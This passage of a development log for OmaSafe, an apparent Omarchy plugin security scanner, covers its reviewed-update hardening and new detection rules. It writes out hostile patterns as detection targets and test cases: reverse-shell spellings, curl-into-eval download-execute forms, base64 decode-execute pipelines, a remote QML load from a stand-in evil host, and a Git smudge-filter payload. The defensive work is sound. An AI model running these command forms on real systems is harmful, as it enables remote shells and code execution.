`plugins review-update ID [--expected-commit SHA] [--yes]` implements the
reviewed update flow end to end. Pre-flight refusals happen before any
mutation: dirty installed worktrees (and unknown git state) are rejected,
a trusted baseline is required, and the plugin origin must be HTTPS. The
candidate commit comes either from `--expected-commit` or from the pinned
registry claim in the cached catalog snapshot (`listed`/`installed-differs`
correlations only); an already-pinned HEAD short-circuits as a no-op.

The exact candidate is fetched into the bounded analysis cache
(`ensure_pinned_repository`, quota + lock inherited), materialized into a
temp checkout, and evaluated before anything touches the live tree: native-
parity manifest validation (S6 mirror) must pass, and the full analysis
pipeline produces findings/capabilities for the delta presentation — added
and resolved rule ids, capability changes versus the last recorded analysis
event, content-digest movement, a capped source diff trusted..candidate,
coverage limitations, and registry context. Approval mirrors the v0.1 rule:
interactive confirmation requires a terminal; `--yes` is accepted only
together with `--expected-commit` matching the candidate exactly.

Mutation is delegated to the native updater (`omarchy plugin update ID
--yes`; fetch/fast-forward, validation with ORIG_HEAD rollback, rescan) via
new bounded wrappers in omasafe-plugin-trust — OmaSafe never forks that
lifecycle logic. Active full-bar plugins are switched back to the default
bar first; enabled plugins are disabled first; both actions are recorded in
an interrupted-state record (`state/review-update.json`) written before the
first mutation and removed at terminal states. A stale record prints manual
recovery guidance and an unreadable one refuses to run.

Postconditions gate everything: fresh inventory must show HEAD equal to the
reviewed commit and a readable shell rescan before re-enabling; trust
advances only after that. Raced candidates (native updater has no expected-
SHA guard yet) leave the plugin disabled with explicit recovery guidance —
including the reset command to restore the reviewed commit — and never
advance trust. Native failures keep the rollback result, stay disabled, and
keep the record for recovery.

Test matrix covers all nine plan rows against real git repositories through
a fake omarchy shim driven by per-invocation environment variables: dirty
refusal, missing baseline, `--yes` without pin fail-fast, happy path
(disable→update→enable ordering, trust advance, record cleanup), invalid
manifest abort, native failure guidance, raced commit detection (trust
proven untouched), rescan failure, interrupted-record guidance, full-bar
switch ordering, and registry-claim resolution feeding the preview.

Gates green in both configurations; 193 parser-backed / 183 lexical tests.
Known limitation carried deliberately: the race window between evaluation
and native mutation exists because the upstream updater lacks an expected-
commit option — the flow detects it post-hoc instead of preventing it;
the upstream proposal is tracked in docs/plans/later.md.

Next: **v0.2 S8 — UI, packaging, release**.

## S8 — UI, packaging, release (2026-08-26)

**Cancellation and interruption safety** (the explicit M9 requirement).
SIGINT/SIGTERM handlers set an atomic flag (omasafe-core::interrupt); the
bounded-child poll loops watch the same flag, so one Ctrl-C stops in-flight
git/updater processes promptly and every long-running command unwinds
through its normal cleanup paths instead of dying mid-write. Phase-boundary
checkpoints cover `plugins analyze`, `scan-plugin`, and `review-update`;
interrupted exits use 130. review-update interruption is fail-closed at
every stage: during quiescing or the native update the plugin stays
disabled with the recovery record kept; after a verified update but before
re-enable/trust, the flow stops with manual completion steps — trust never
advances on an interrupted run. Temporary candidate checkouts orphaned by
hard deaths are swept by pid liveness at each run's start.

**Panel data contract.** `scan-plugin --format json` / `plugins analyze
--format json` already carried everything the omarchy panel consumes; an
integration test now pins the schema: analysis sections (findings with
rule_id/severity/confidence/evidence, capabilities, invocation_edges,
coverage_limitations, fingerprint, policy_identity, equivalence), payload
inventory sections, and the parser block whose explicit null in
lexical-fallback builds is itself the visible degradation signal. The
panel-side views live in the sibling omasafe-plugin repo and evolve there
against this pinned contract.

**Release tooling.** `scripts/release-gate.sh` implements the release
checklist verbatim: format + clippy/tests in BOTH configurations,
generated-asset currency, determinism canary, corpus-tooling self-tests,
a bounded corpus sample, native-validator parity, the self-scan of
OmaSafe's own source, and provenance — writing all evidence reports to
release-reports/. The tag-triggered workflow gained a reports job that
generates self-scan/corpus/parity JSON in CI and publishes them as release
assets alongside the signed archive. Clean-VM lifecycle checks
(install/upgrade/downgrade/uninstall via the reviewed pinned installer,
schedule coexistence, panel enable/rescan/disable lifecycle, third-party-
bar notification independence) are codified in `scripts/vm-lifecycle.sh`
for per-release runs against a fresh VM snapshot.

Verified locally end-to-end: gate exit 0 with live corpus sample (12
scanned, 0 incomplete) and parity (12 compared, 0 disagreements against
4.0.1); self-scan produced 13 findings / 160 capability observations with
disclosed coverage limitations. Remaining manual steps before v0.2 tagging:
review the self-scan findings, confirm the nightly full-corpus baseline is
provisioned, sign the tag. The sibling panel repo ships its views
separately with its own update cadence, as documented in the README.

Codex review of the S8 slice returned CHANGES-REQUIRED with eight blockers,
all fixed and re-verified. The recovery record is now durably stored before
the first quiescing action, every quiesce failure keeps it (phase "failed")
instead of deleting it, and an unresolved record for a DIFFERENT plugin
blocks a new review outright — records can no longer be overwritten or
dropped by unrelated operations. An interrupt during final re-enable is
reported as a 130 exit with manual completion steps instead of a successful
run; the shared analysis emitter gained an output-commitment checkpoint so
`plugins analyze` / `scan-plugin` / `scan` honor interrupts that land during
analysis rather than completing with exit 0; interrupt messages state the
actual phase instead of claiming "no partial state". The stale-checkout
sweeper replaced pid heuristics with kernel-owned ownership: each checkout
carries a flock-held `.owner.lock`, so sweepers remove only checkouts whose
owner provably died (pid reuse is irrelevant), verified by the updated test
using unique per-run directory names. Non-Unix bounded loops now also honor
the flag, signal registration uses libc constants, the SIGINT test helper
drains pipes concurrently to rule out deadlocks, and the release workflow's
reports job creates its output directory. The release gate became strict:
corpus runs execute with --gate-high (unaccounted high severity fails the
release), incomplete repositories block via an explicit report check, and
parity must be status "compared" with zero disagreements on the recorded
version — degraded parity blocks rather than passes. vm-lifecycle.sh was
rewritten against the real installer URL (raw install-cli.sh at the tag),
with correct remote-expansion quoting and an uninstall step plus post-
uninstall persistence verification. Final strict gate run: exit 0 with
--gate-high passed, zero incomplete, parity 12 compared / 0 disagreements.

Next: **v0.2 tag** (signed) once the nightly full-corpus baseline is
provisioned and the self-scan findings get their triage pass.


## v0.2.1 H1 — Fail-Closed Reviewed Update and Severity Fidelity

Status: **complete**

Implemented (per `docs/plans/v0.2.1-hardening-implementation.md`, scope
source `docs/reviews/2026-08-27-scan-rule-coverage-review.md`):

- Review-update post-update dirty postcondition now fails closed for BOTH
  `dirty == Some(true)` and unknown (`None`) worktree state — the same
  uncertainty the pre-flight already refuses — leaving the plugin disabled,
  keeping the flow record in phase "failed", and never re-enabling or
  advancing trust.
- New installed-bytes verification between the native mutation and any
  re-enable: a dedicated `worktree_content_map` compares every file under the
  INSTALLED tree against the approved candidate checkout byte-for-byte
  (mode + size + content digest, symlink targets included; only the `.git`
  subtree and the checkout's own `.owner.lock` are excluded). HEAD matching
  with divergent bytes — e.g. a payload smuggled in through `.gitignore` — is
  now caught where the old checks passed it.
- Analyzer policy identity captured before mutation and re-checked after:
  a mid-flight policy change fails closed instead of trusting an analysis
  made under different rules.
- Installed-tree analysis coverage state and analysis fingerprint must match
  the approved candidate; mismatches leave the plugin disabled without
  advancing trust.
- Trust advances from the identity of the verified INSTALLED tree, never from
  the temporary staging checkout.
- Severity fidelity: new analyzer finding rules no longer collapse into one
  generic "warning" alert — each added rule id emits its own alert carrying
  the catalog severity and title. `track_highest_severity` was rewritten to a
  single ladder over both vocabularies (`none < info < low < warning <
  medium < error < high < critical`) so `error`/`high` alerts can no longer
  be flattened to `warning`; `scan` JSON `highest_severity` reflects it.
  Desktop notification bodies now carry `[severity]`.
- Tests: review-update against a post-mutation dirty worktree, an unavailable
  git status, and a planted `.gitignore`-hidden payload all fail with nonzero
  exit, plugin left disabled, trust not advanced, and no enable attempted;
  finding-regression alerts assert catalog severity survives to
  `highest_severity`.

Verification:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace
scripts/release-gate.sh --skip-network                   # exit 0
```

Next: H2 (reference sinks) with the split severity from the H0 record.

## v0.2.1 H0/H1 — Review-Response Revision (second pass)

Status: **complete**

Three review passes closed seventeen findings (seven in the second, five in
the final residual pass). The earlier revision text (custom worktree walker, wholesale
`.git` exclusion, notify-send assertion) described since-replaced machinery
and is superseded by this entry.

H0 — runtime reverification and lifecycle boundary (complete, machine-executed):

- `scripts/h0-runtime-reverify.sh` probes run isolated quickshell instances
  with loopback-served inert QML. Probe A: network `Loader.source` REACHABLE
  (marker instantiated). Probe B was corrected to wait for asynchronous
  completion — `Qt.createComponent("http://...")` enters Loading and reaches
  Ready with a working instance, so remote component creation IS reachable and
  the planned High rule covers both sinks. Probe C: remote directory imports
  are scanner-intercepted (URL normalizes onto a relative path and is dropped)
  — H2 ships them as an indicator, not the High finding; the plan doc was
  updated to split severity by sink.
- Probe D runs the REAL native install helper (`omarchy plugin add
  <local marker repo> --enable --yes`) against a SECOND omarchy shell launched
  from a disposable config copy with a disposable HOME (unique instance path;
  the live session shell is never addressed) behind an explicit
  `OMASAFE_H0_ALLOW_LIFECYCLE=1` guard. Assertions: helper exit 0, marker
  discovered and enabled, IPC-only disable transition (true -> false), no
  leftover hidden `.add.tmp.*` staging directory.
- The script asserts expected markers per probe AND validates each probe's
  exit status: probe B and the type-missing branch of probe C require exit 0,
  the scanner-interception branch of probe C requires the verified runtime's
  255, and any other status (timeout kill included) fails the probe. Exit 0
  only when every probe produced its expected verdict; 1 on any timeout,
  error marker, missing marker, forbidden marker, unexpected exit status, or
  failed transition; 2 on lifecycle-guard refusal. Probe guards stop
  themselves once the verdict lands so success never trips the timeout
  ceiling.
- Surface doc re-stamped 2026-08-27 (Omarchy 4.0.1-1 / Quickshell 0.3.1-1;
  package changed from quickshell-git, triggering the reverification) with
  the three reverified answers and the InputInjection / ScreenCapture /
  SensitiveDataAccess capability vocabulary. Clean-VM re-run of the script is
  the remaining release step.

H1 — fail-closed reviewed update and severity fidelity (final design):

- Audits run BEFORE mutation. The native updater executes `git fetch` +
  `git merge`, which would run a pre-existing `post-merge` hook and honor
  every .git/config directive before any postcondition could report them, so
  `audit_installed_git_state` (active-hook audit + config allowlist) gates the
  delegated update: on refusal the updater is never invoked.
- The update window is hardened in depth, with one accepted residual recorded
  below. `run_omarchy` inherits the full Git hardening (global/system config
  neutralized; `core.fsmonitor=false`, `core.hooksPath=/dev/null`, empty
  `diff.external`, `protocol.ext.allow=never`, and an empty `credential.helper`
  that resets any raced helper list, injected via GIT_CONFIG_COUNT env with
  command-line precedence), so a writer racing the window cannot make
  fetch/merge execute fsmonitor/hook/credential/diff commands. Subsection-keyed
  sinks (`filter.<name>`, `merge.<name>.driver`, `url.<base>.insteadOf`) cannot
  be enumerated, so `GitConfigGuard` swaps the audited `.git/config` for a
  hardened minimal snapshot — which DEFINES no such sink — for the duration of
  the delegated update and restores the original afterwards, including on
  failure and interrupt. The `hardened_config_neutralizes_a_smudge_filter`
  regression proves this by content: a real `filter.evil.smudge` payload runs
  under a positive control without hardening, and never runs while the snapshot
  is in place.
- Accepted residual (same-UID execution): the swap neutralizes sinks by
  content, but it cannot make a file the file's own owner is forbidden to
  rewrite. A same-UID process that races a NEW `.git/config` carrying a
  subsection-keyed sink into place between the swap and Git's read can still get
  that command executed during fetch/merge — userspace cannot prevent this
  without privilege. It is instead made NON-TRUST-ADVANCING: the restore is
  tamper-evident via a metadata witness (inode/ctime/mtime/size, not just
  bytes, so a write-then-revert-to-identical-bytes is still caught), so any
  concurrent write is detected, discarded, and fails the update — trust never
  advances over a tampered window even though the injected command may already
  have run. A regression fixture appends `core.fsmonitor` synchronously before
  the fake updater's git fetch; the update completes native Git work without
  executing the injected command and is then refused, leaving the plugin
  disabled and the config clean.
- The config audit parses with Git itself under bounded hardened settings
  (`config --file .git/config --list --null`, so CLI-injected hygiene
  settings can never leak into the audit). The allowlist is EXACT keys with
  VALUE validation — no broad namespaces: `gc.*` is denied wholesale (Git
  executes `gc.recentObjectsHook`-style values through the shell),
  `remote.origin.url` must equal the production HTTPS origin exactly
  (ext::/scp-style/paths refused) and `remote.origin.fetch` must be the
  standard tracking refspec, branch tracking remotes must be remote names
  (never paths), and pull/fetch/push keys are enumerated with enum values.
  hooksPath, sshCommand, fsmonitor, askPass, credential helpers, diff/gpg
  programs, aliases, filters, includes, insteadOf, and submodule machinery
  all fail closed by absence. Unit tests pin executable/redirecting key
  refusals and origin/refspec value validation.
- Installed-vs-candidate verification is layered. Byte equality via
  SourceIdentity's collector covers the worktree (tracked, ignored, hidden)
  on both sides; git internals that legitimately differ between a detached
  review checkout and a branch-based installed clone (.git/HEAD,
  packed-refs, template hook samples, .git/config, the checkout-side
  .owner.lock) are exempt from BYTES and verified semantically instead:
  resolved tree identity (installed HEAD^{tree} must equal the candidate's
  tree object, with HEAD already pinned to the candidate) plus the audits
  above.
- ANY SourceIdentity limitation on either side fails closed (file_limit,
  unreadable_directory/file, metadata_unavailable, oversize_file,
  aggregate_byte_limit, tree_depth_limit, directory_entry_limit,
  git_hooks_unreadable, git_metadata_unreadable, git_metadata_oversize,
  git_hook_unreadable, git_hook_oversize, collection budget, interruption):
  a partial digest map can never prove byte equality.
- The traversal machinery in omasafe-plugin-trust was rewritten as a bounded
  collector: MAX_TREE_DEPTH recursion cap, per-directory child cap checked
  DURING accumulation (entry bombs stop before materializing), global
  MAX_FILES/aggregate-byte limits, a wall-clock collection budget, and
  cooperative interruption — every bound surfacing as a visible limitation.
  The .git metadata capture (config, HEAD, packed-refs, EVERY hooks entry)
  runs through the same bounds — the same caps, the same byte accounting, the
  same budget and interruption checks — so a hook-directory entry bomb or
  hook flood surfaces a limitation instead of bypassing the collector. Git
  metadata and hook reads are capped at `MAX_METADATA_BYTES` and disclose
  truncation rather than silently accepting equal prefixes; once the
  aggregate budget is exhausted the collector retains only bounded size
  sentinels, so retained bytes stay within the advertised 64 MiB no matter
  how many metadata or hook files follow. Unit tests pin deep-tree,
  entry-bomb, hook-bomb, metadata-truncation, and aggregate-budget behavior.
- The candidate checkout now shapes its origin remote exactly like an
  installed clone (remote add + set-url to the production HTTPS URL) and the
  test fixture installs branch-based (symbolic HEAD) checkouts, matching
  native clones.
- Severity fidelity unchanged from the first pass: per-rule catalog-severity
  alerts, ladder-ordered highest severity, `[severity]` in notification
  bodies, and tests proving a High finding (oma.qml.session-lock) reaches
  the notify-send payload as `[high]`.

Verification:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 62 cli + 15 trust tests
scripts/h0-runtime-reverify.sh                           # probes A/B/C
OMASAFE_H0_ALLOW_LIFECYCLE=1 scripts/h0-runtime-reverify.sh --with-lifecycle
```

Next: H2 (reference sinks) with the split severity from the H0 record; clean-VM
re-run of the H0 script before tagging.

## v0.2.1 H2 — Reference Sinks: Remote, Out-of-Tree, Typed Rejections

Status: **complete**

Implemented per `docs/plans/v0.2.1-hardening-implementation.md` (maps to review
findings R-1 and R-2), with the severity split the H0 record fixed:

- New High rule `oma.qml.remote-component-load`: a URL-scheme literal at the
  two H0-verified reachable load positions — `Loader.source` and
  `Qt.createComponent(...)`. Until now a literal remote `Loader` source took
  the `Value::Static` branch and was silently dropped as an unresolvable
  reference; the network detectors never saw it either.
- New indicator `oma.qml.remote-directory-import` (Low, never the High rule):
  remote directory imports, `as`-qualified or bare, with or without a qmldir.
  Per H0 probe C these are scanner-intercepted on the pinned runtime, so the
  rule records intent; its guidance demands re-probing any newer runtime
  before escalation. Local relative directory imports stay silent.
- New Medium rule `oma.qml.out-of-tree-reference`: absolute-path and traversal
  references at load sinks (`Loader.source`, `Qt.createComponent`, `Qt.include`)
  and in directory-import specifiers. Summary and guidance describe these as
  unreviewed out-of-tree loads that bypass commit-bound review — explicitly
  not sandbox escapes; there is no runtime sandbox.
- `Qt.createComponent(` and `Qt.include(` joined both dynamic-code needle
  sets: the AST call list (`eval | createQmlObject | atob` -> `+ createComponent
  | include`) and the lexical set, so both spellings carry
  `oma.qml.dynamic-code` and the `dynamic-code-execution` capability.
- Typed sink-position rejections (R-2): reference candidates now carry a sink
  marker for the six verified positions (`Loader.source`,
  `Qt.createComponent`, `Qt.include`, `Process.command`, `execDetached`,
  `FileView.path`). When a sink-position candidate fails in-tree resolution,
  `analyze_inventory` records a `sink-reference-rejected:<reason>` limitation
  with reason `remote`, `absolute`, `traversal`, `missing-local-target`, or
  `unsupported-scheme`, sorted and deduplicated for deterministic reports.
  A finding-bearing spelling (remote at a load sink, out-of-tree at a load
  sink) is consumed by its finding — the two disclosures never double-report
  the same literal. Non-sink path-shaped strings stay inventory context
  exactly as before, so icon names, format strings, and unresolvable
  non-sink paths produce nothing.
- Rejection classification mirrors `resolve_reference`'s rejection order
  (absolute, then scheme spelling — `http`/`https` are the remote family,
  other schemes are `unsupported-scheme` — then traversal after stripping the
  ordinary leading `./`, then `missing-local-target`).
- AST/lexical parity: the AST path marks candidates precisely at binding and
  call arguments (static-shaped values only — computed fragments are left to
  the H4 dataflow slice); the lexical fallback marks quoted literals on lines
  that spell a sink construct and handles `import "<specifier>"` lines.
  Multi-line lexical constructs degrade to context, consistent with the
  documented lexical-fallback semantics.
- Resolved sink references still form invocation edges and mark
  `invocation_target` (local `Loader`, `FileView.path`, and `Qt.include`
  targets are unchanged behavior).
- New adversarial fixtures under `fixtures/plugins/` (each a valid plugin
  tree, load-bearing via CLI tests): `remote-component-loader`,
  `remote-create-component`, `remote-directory-import` (remote + local qmldir
  variant), `out-of-tree-absolute`, `out-of-tree-traversal`, and
  `benign-references` (icon names, format strings, commented URL, non-sink
  path-shaped string, resolving local Loader). Loader bindings are spelled
  single-line so both feature configs exercise sink marking; multi-line
  Loader blocks degrade to context in lexical builds by design.
- Catalog: `RULE_CATALOG_VERSION` 3 -> 4; `SEVERITY_TABLE_VERSION` unchanged
  (new rules are a catalog change, not a severity-table rewrite). The
  surface-anchor test pins the three H0-verified anchors.

Tests: analyzer unit tests cover literal-remote Loader/createComponent High
findings with per-path confidence, indicator-only directory imports, local
import silence, out-of-tree Medium findings, the `Qt.include`
remote-vs-out-of-tree split, all five typed rejection reasons, non-sink
silence, edge resolution through sink candidates, and lexical JS parity; CLI
tests scan all six fixtures end-to-end and the old negative-provenance test
now asserts the traversal Loader finding instead of expecting silence. The
release-gate self-scan now carries the fixture findings by design (the
adversarial fixtures live in this repository); each fixture produces exactly
the rule it exists to prove.

Verification:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 70 cli + 15 trust tests
scripts/determinism-canary.sh                            # exit 0
scripts/release-gate.sh --skip-network                   # exit 0
```

Next: H3 (script pattern expansion) and the H7 early-pass triage kickoff for
`oma.script.reverse-shell` and
`oma.script.privileged-shared-temp-controlled`.

## v0.2.1 H2 — Review Response (six findings)

Status: **complete**

Second-pass review found six issues, four of which could miss or falsely
create blocking findings. All six are closed with regression tests; the
review's own escape-hatch fixtures (multi-line Loader spelling) were the only
test changes needed outside the analyzer.

1. **Escaped literals bypassed remote-load detection (P1).**
   `string_literal_content` kept only `string_fragment` nodes, so
   `Loader { source: "\x68ttps://evil.example/W.qml" }` — a valid runtime
   HTTPS URL — was analyzed as `ttps://…` and emitted nothing. String
   extraction now decodes escape sequences (added `decode_js_escapes`):
   `\xHH`, `\uHHHH`, `\u{…}`, the standard single-character escapes, and
   JS unknown-escape semantics (backslash dropped). Decoding happens exactly
   once per escape, at extraction, on both paths — the AST decodes each
   `escape_sequence` node individually so a literal backslash produced by
   `\\` cannot be re-decoded into scheme characters, and the lexical path
   decodes raw literal content at extraction. Evidence carries the decoded
   runtime value; a doubled-backslash literal regresses as NOT remote.
2. **Qualified Loader types were silently missed (P1).** The grammar permits
   `nested_identifier` object types, but `is_loader` and
   `handle_object_definition` examined only direct `identifier` children, so
   `import QtQuick as QQ; QQ.Loader { source: "https://…" }` bypassed sink
   marking. Type resolution now takes the terminal segment of the resolved
   type node (`QQ.Loader` -> `Loader`) for every inventoried object type
   (Loader, Process, FileView, Timer), so qualified spellings reach the same
   sink rules, capability observations, and edge resolution.
3. **Scheme matching was too narrow (P1).** Scheme parsing is centralized in
   `scheme_class` and applied identically by rejection reasons, the
   remote-load family, and the out-of-tree family. Schemes are
   case-insensitive (RFC 3986), so `HTTPS://…` now carries the High finding
   with its original spelling preserved in evidence. The remote set is the
   network transports Qt's component loader accepts on the pinned runtime
   (`http`, `https`). `file://` URLs are classified as local paths — the
   Medium out-of-tree family at load sinks, and the `absolute` rejection
   reason at non-load sinks — never remote, never plain `unsupported-scheme`.
4. **User-defined methods could become Qt findings (P1).** `callee_name` is
   the last member segment, so `backend.createComponent("https://…")` was
   treated as `Qt.createComponent`. AST call handling now verifies the
   receiver is the Qt global (identifier `Qt`, not a member expression) for
   `createComponent` and `include` before applying the Qt-specific rules —
   both their sink/reference handling and their dynamic-code emission. The
   lexical path matches only the `Qt.createComponent(`/`Qt.include(`
   spellings, which cannot match a different receiver. `eval`, `atob`,
   `createQmlObject`, and `new Function` keep their published receiver-blind
   semantics.
5. **Rejection resolution ignored the analysis budget and had no output cap
   (P1).** The resolution loop now checks `TimeBudget::expired()` per edge
   and discloses `analysis_time_budget_exhausted` (deduplicated against the
   scan loop's disclosure) on expiry. Retained sink rejections are capped at
   a new `MAX_SINK_REJECTIONS` (256, wired into the limits configuration and
   hence the policy identity); overflow emits a
   `sink-reference-rejections-truncated:<total>` limitation. An adversarial
   tree of unique sink literals can no longer expand limitation strings
   without bound.
6. **Lexical sink marking attributed every literal on the line (P2).** The
   whole-line marking let `Loader { source: "Panel.qml"; property string
   docs: "https://docs.example" }` produce a High finding for the unrelated
   `docs` value in the no-parser build, and any `command` identifier on a
   standalone-JS line was treated as `Process.command`. Marking is now
   span-scoped: call arguments via `balanced_bracket_span`, binding values
   via `binding_value_span` (Loader.source, FileView.path, Process.command)
   and the `execDetached` argument span. This exposed a latent
   `binding_value_span` bug the new spans depend on: the scalar scan broke
   on `//` inside quoted strings, truncating URL-valued bindings at their
   scheme (`"https:`); the scan is now quote-aware. The review's example now
   yields exactly one rejection for `Panel.qml` and nothing else.

Tests: ten new analyzer tests pin escape decoding (including the
double-backslash non-decode), qualified Loader/Process types, case
insensitivity and `file://` classification, Qt-receiver verification on both
paths, the rejection cap and truncation disclosure, budget-bounded
resolution, and lexical span scoping. Full verification re-run:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 111 analyzer (parser) / 101 (lexical)
scripts/release-gate.sh --skip-network                   # exit 0
```

## v0.2.1 H2 — Review Response (second round, four findings)

Status: **complete**

1. **Nested bindings inherited the outer Loader sink (P1).** The object
   brace scope includes nested child objects, and the binding search did not
   track brace depth, so `Loader { Image { source: "https://…" } }` treated
   the nested Image.source as Loader.source and emitted a false High finding
   in lexical mode. `mark_binding_literals` now splits the matched object's
   body into depth-zero segments (slicing only at brace bytes, which are
   ASCII and cannot split a multi-byte character) and marks bindings only
   there; a depth-zero binding next to a nested child still participates.
   AST parity pinned: the parser path already resolved only the owning
   object's direct bindings.
2. **Lexical dynamic-code detection used the old Qt needle (P2).** Sink
   detection verifies the Qt-global receiver via `find_qt_global_calls`, but
   dynamic-code still matched the raw substring, so
   `backend.Qt.createComponent(...)` emitted `oma.qml.dynamic-code` while a
   valid `Qt . createComponent(...)` (whitespace around the dot) emitted the
   remote-load finding but MISSED the required dynamic-code finding and
   capability. Both needles now go through `find_qt_global_calls`, keeping
   dynamic-code and sink verdicts consistent on both shapes.
3. **Overflow count was not unique after the cap (P2).** Once the retained
   unique set is full, omitted rejections are not remembered, so repeating
   the same unretained rejection incremented the overflow counter each time
   while comments described a unique count. The counter is now honestly an
   OCCURRENCE count (`sink_rejections_omitted`, documented in code): remembering
   which values were omitted would need unbounded fingerprints under
   adversarial input. A new test pins that two occurrences of the same value
   past the full set report `sink-reference-rejections-truncated:2`; the
   existing unique-set and duplicate-crowding tests are unchanged.
4. **Formatting gate failed (P1).** `cargo fmt --all` applied; the gate was
   re-run end-to-end (format, clippy both feature configs, workspace tests
   both configs — 111 analyzer tests with the parser / 101 without, 70 CLI
   tests — generated assets, determinism canary, corpus tooling self-tests,
   self-scan) and passes.

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 111 analyzer (parser) / 101 (lexical)
scripts/release-gate.sh --skip-network                   # exit 0
```

Next: H3 (script pattern expansion) and the H7 early-pass triage kickoff for
`oma.script.reverse-shell` and
`oma.script.privileged-shared-temp-controlled`.

## v0.2.1 H3 — Script Pattern Expansion

Status: **complete**

Implemented per `docs/plans/v0.2.1-hardening-implementation.md` (the pattern
half of review finding R-3; staged chains and dataflow stay in H4):

- `oma.script.reverse-shell` (High, shell) matches the highest-signal
  spellings on one comment-stripped line: a `/dev/tcp/` redirect token
  (counted in any spelling — inside a bundled script it is payload material),
  `nc`/`ncat`/`netcat -e`/`-le`, `socat … exec:`, and `bash -i >&`. The
  benign listener (`nc -lvnp 4444`, no execute flag) stays silent.
- `oma.python.reverse-shell` (High) requires socket wiring
  (`socket.socket`, `socket.create_connection`, `create_connection(`) AND
  process wiring (`subprocess`, `os.system`, `os.execv`, `pty.spawn`,
  `os.dup2`) on the same statement line; either half alone stays silent.
  Multi-line Python wiring is explicitly the H4 slice.
- Download-execute gains the same-line no-pipe consumption variants:
  `eval "$(curl …)"` (and unquoted `eval $(…)`) is detected through
  eval-to-`$(` adjacency judged on the RAW line, because the substitution is
  inside quotes and invisible to `unquoted_text`; `source <(curl …)`,
  `. <(wget …)`, and interpreter-headed `bash <(curl …)` are detected
  through a `<(` whose feeding token consumes (`source`, `.`, or an
  interpreter basename). `eval "$FLAGS"` never fires; `diff <(curl a)
  <(curl b)` only compares and stays silent.
- `oma.script.decode-execute` (High): `base64 -d`/`--decode`,
  `openssl enc|base64 … -d`, and `xxd -r` (flags token-exact, so `-depth`
  cannot satisfy `-d`) combined with an interpreter consumer on the same
  line — pipe, eval-substitution, or process-substitution. Decoding without
  a consumer stays inspection (`base64 -d file > out`). Guidance records the
  shell blind spot: an unquoted base64 blob is not a quoted literal, so the
  obfuscation indicator cannot fire on shell; this rule is the line-level
  net.
- `oma.script.privileged-shared-temp` (Low indicator): a privilege wrapper
  (`sudo `/`pkexec `/`doas `) touching a `/tmp/` or `/dev/shm` path. A
  pathname alone never proves attacker control, and the indicator id is
  never repurposed as the finding.
- `oma.script.privileged-shared-temp-controlled` (High): an explicit mode
  release on the same line — `chmod` with a group/other-writable octal mode
  (`666`, `0777`, `1777`… value & 0o022 ≠ 0) or a symbolic `+w`/`=w`
  spelling whose who-list includes group/other/all (`a+w`, `go+w`, `o=w`;
  owner-only `u+w` and non-releasing modes stay silent). The connected
  untrusted-write predicate is H4.
- Egress attribution: a live fetch tool (`curl`/`wget` word in unquoted
  script code) records the `network-access` capability without any finding,
  and QML `Process.command` argv records it too — judged on the argv
  expression text in both the AST and lexical paths, so a computed argv
  fragment (an array mixing literals and identifiers classifies as dynamic)
  still attributes egress. This is the precondition for the H6
  source-to-egress rules. A quoted curl mention is not egress.
- Command-token basenames tolerate prefixed punctuation from substitutions
  and subshells (`<(base64`, `$(curl`, `/usr/bin/nc`) so glue characters
  cannot hide a tool word.
- Fixtures under `fixtures/plugins/` (each a complete plugin tree, scanned
  end-to-end by CLI tests): `reverse-shell`, `download-execute-nopipe`,
  `decode-execute`, `privileged-shared-temp`,
  `privileged-shared-temp-controlled`, and `benign-scripts` (the paired
  near-misses: logged curl-pipe string, `nc` listener without `-e`,
  non-temp sudo, decode without a consumer, non-releasing chmod — zero
  findings, with the live wget still recording egress honestly).
- Catalog: `RULE_CATALOG_VERSION` 4 -> 5. `SEVERITY_TABLE_VERSION`
  unchanged (new rules, no severity rewrites). Equivalence map untouched —
  moving `privileged-process-control-from-shared-temp` to
  `partial-overlap` is H5's decision.

Tests: analyzer unit tests cover all four reverse-shell spellings and the
listener negative, socket/process wiring split, all five no-pipe variants
with their near-misses, decode consumers and inspection negatives, the
indicator/controlled split (each alone, both on one line, and the quiet
paths), script + QML argv egress attribution, and quoted-literal invisibility.
CLI tests scan all six fixtures and assert exact rule counts and severities;
both feature configs pass (the QML argv test exercises the AST path in
parser builds and the span path in lexical builds).

Verification:

```text
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings   # both feature configs
cargo test --workspace                                   # 121 analyzer (parser) / 111 (lexical)
./scripts/generate-cli-assets.sh --check                 # exit 0
scripts/determinism-canary.sh                            # exit 0
python3 scripts/test_corpus_tooling.py                   # pass
```

## v0.2.1 H3 — Review Response (five findings)

Status: **complete**

First-pass review found five correctness issues, four of which could create
blocking findings from quoted prose or unrelated commands. All five are
closed with regression tests; the structural change is statement scoping.

1. **Fetcher/substitution pairing was line-wide (P1).** `eval "$(date)";
   curl …` and quoted prose such as `log 'eval "$(curl …)"'` emitted the
   High download-execute finding. `eval_consumed_spans` now finds only
   LIVE-code eval words (quoted prose is blanked in the unquoted view whose
   offsets align with the raw line), parses the exact substitution span
   each eval consumes (`"$(
 … )"` or bare `$( … )` via the quote-aware
   bracket scanner), and the fetcher must sit inside THAT span's runtime
   text. Single-quoted `$( … )` never expands and never fires. The same
   binding applies to process substitutions: `source <(cat notes); curl …`
   no longer pairs a consuming `<(` with an unrelated fetch. An
   echo-wrapped fetch (`eval "$(echo 'curl … | sh')"`) stays silent because
   span content is judged after quoted regions are blanked.
2. **Python reverse-shell wiring was word co-occurrence (P1).**
   `socket.socket(); subprocess.run(["notify-send", "done"])` was a High
   finding. The predicate now requires a connect operation (`.connect(` or
   `create_connection(`) plus socket use by a process: a `dup2(`
   descriptor handoff, or `fileno()` flowing into `Popen`/`subprocess`/
   `os.system`/`pty.spawn`/`os.exec`. A connect that never hands its
   descriptor to a process (e.g. spawning `curl` separately) stays silent.
   Line-level scope is deliberate: the classic Python one-liner chains
   socket, connect, and `dup2` across `;`-separated statements.
3. **Decoder/consumer pairing was line-wide (P1).** `base64 -d input >
   output; printf ok | sh` emitted the High decode-execute finding. The
